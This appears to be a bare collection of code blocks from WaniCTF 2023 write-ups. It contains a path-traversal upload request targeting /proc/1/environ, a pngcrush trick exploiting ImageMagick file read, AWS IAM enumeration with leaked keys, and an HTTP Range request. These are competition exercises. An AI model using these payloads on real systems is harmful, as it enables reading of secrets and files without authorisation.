# WaniCTF 2023 Writeups

> 原文: https://www.ctfiot.com/113562.html
> ID: 113562


```
window.onload = function () {
 var openRequest = indexedDB.open("testDB");

 openRequest.onupgradeneeded = function () {
 connection = openRequest.result;
 var objectStore = connection.createObjectStore("testObjectStore", {
 keyPath: "name",
 });
 objectStore.put({ name: "FLAG{[redacted]}" });
 };
 ...
}
```



```
POST / HTTP/1.1
Host: extract1-web.wanictf.org
Content-Length: 457
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary31EmG2GSyMaONPVG
Connection: close

------WebKitFormBoundary31EmG2GSyMaONPVG
Content-Disposition: form-data; name="file"; filename="x.zip"
Content-Type: application/x-zip-compressed

PK
...
------WebKitFormBoundary31EmG2GSyMaONPVG
Content-Disposition: form-data; name="target"

flag
------WebKitFormBoundary31EmG2GSyMaONPVG--
```



```
GET /2gb.txt HTTP/1.1
Host: 64bps-web.wanictf.org
Connection: close
Range: bytes=2147483648-
```



```
if (!req.query.url.includes("http") || req.query.url.includes("file")) {
 res.status(400).send("Bad Request");
 return;
}
```



```
ARG MAGICK_URL="https://github.com/ImageMagick/ImageMagick/releases/download/7.1.0-51/ImageMagick--gcc-x86_64.AppImage"
```



```
$ convert -size 500x500 xc:white test.png

$ pngcrush -text a "profile" "/flag_A" test.png read_flag1.png
 Recompressing IDAT chunks in test.png to read_flag1.png
 Total length of data found in critical chunks = 179
 Best pngcrush method = 5 (ws 15 fm 1 zl 9 zs 1) = 179
CPU time decode 0.004579, encode 0.007305, other 0.008650, total 0.024044 sec
```



```
$ identify -verbose 5025f8fc-e012-4e48-95bc-1a5120173765.png 
Image:
 Filename: 5025f8fc-e012-4e48-95bc-1a5120173765.png
 Format: PNG (Portable Network Graphics)
 Mime type: image/png
 Class: PseudoClass
...
 Raw profile type:

 42
464c4[redacted]17d0a

 signature: c984ee3cffb73bfe6b045d9af5c2cf26f72a8731188e5ac7f911d2ef570c9e6c
...
```



```
$ aws configure
AWS Access Key ID []: ******************7
AWS Secret Access Key []: ******************3
Default region name []: ap-northeast-1
Default output format [None]:
```



```
$ aws lambda list-functions

An error occurred (AccessDeniedException) when calling the ListFunctions operation: User: arn:aws:iam::839865256996:user/SecretUser is not authorized to perform: lambda:ListFunctions on resource: * because no identity-based policy allows the lambda:ListFunctions action
```



```
$ aws iam list-attached-user-policies --user-name SecretUser --query 'AttachedPolicies[].PolicyArn'
[
 "arn:aws:iam::839865256996:policy/WaniLambdaGetFunc",
 "arn:aws:iam::aws:policy/AWSCompromisedKeyQuarantineV2"
]

$ aws iam get-policy --policy-arn arn:aws:iam::839865256996:policy/WaniLambdaGetFunc
{
 "Policy": {
 "PolicyName": "WaniLambdaGetFunc",
 "PolicyId": "ANPA4HC66ZQSAS4EGIKSK",
 "Arn": "arn:aws:iam::839865256996:policy/WaniLambdaGetFunc",
 "Path": "/",
 "DefaultVersionId": "v1",
 "AttachmentCount": 1,
 "PermissionsBoundaryUsageCount": 0,
 "IsAttachable": true,
 "CreateDate": "2023-04-23T01:27:27+00:00",
 "UpdateDate": "2023-04-23T01:27:27+00:00",
 "Tags": []
 }
}

$ aws iam get-policy-version --policy-arn arn:aws:iam::839865256996:policy/WaniLambdaGetFunc --version-id v1
{
 "PolicyVersion": {
 "Document": {
 "Version": "2012-10-17",
 "Statement": [
 {
 "Sid": "VisualEditor0",
 "Effect": "Allow",
 "Action": [
 "iam:ListPolicies",
 "iam:GetRole",
 "iam:GetPolicyVersion",
 "iam:GetPolicy",
 "iam:ListAttachedRolePolicies",
 "iam:ListAttachedUserPolicies",
 "iam:ListRoles",
 "apigateway:GET",
 "iam:ListRolePolicies",
 "iam:GetRolePolicy"
 ],
 "Resource": "*"
 },
 {
 "Sid": "VisualEditor1",
 "Effect": "Allow",
 "Action": "lambda:GetFunction",
 "Resource": "arn:aws:lambda:ap-northeast-1:839865256996:function:wani_function"
 }
 ]
 },
 "VersionId": "v1",
 "IsDefaultVersion": true,
 "CreateDate": "2023-04-23T01:27:27+00:00"
 }
}
```



```
$ aws lambda get-function --function-name arn:aws:lambda:ap-northeast-1:839865256996:function:wani_function
{
...
 "Code": {
 "RepositoryType": "S3",
 "Location": "https://aw..."
 }
}
```



```
POST /create HTTP/1.1
Host: certified-web.wanictf.org
Content-Length: 209
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynhRb8NemRluVGlVs
Connection: close

------WebKitFormBoundarynhRb8NemRluVGlVs
Content-Disposition: form-data; name="file"; filename="../../../../../../proc/1/environ"
Content-Type: image/png

hoge
------WebKitFormBoundarynhRb8NemRluVGlVs--
```



```
HTTP/1.1 500 Internal Server Error
Server: nginx
Date: Sat, 06 May 2023 05:36:43 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 208
Connection: close

Failed to process image

Caused by:
 image processing failed on ./data/c30bb6ca-63a6-4c9f-ade1-0b3c3fb88a74:
 magick: no decode delegate for this image format `' @ error/constitute.c/ReadImage/741.
```



```
$ exiftool chall.mp4 
ExifTool Version Number : 12.57
File Name : chall.mp4
...
Publisher : flag_base64:[redacted]
Image Size : 512x512
...
```



```
$ file *
updog: ISO 9660 CD-ROM filesystem data 'ISO Label'
```



```
$ python3 CTF-Usb_Keyboard_Parser/Usb_Keyboard_Parser.py chall.pcap

[+]Using filter "usb.capdata" Retrived HID Data is :

FLAG{[redacted]}

[+]Using filter "usbhid.data" Retrived HID Data is :
```
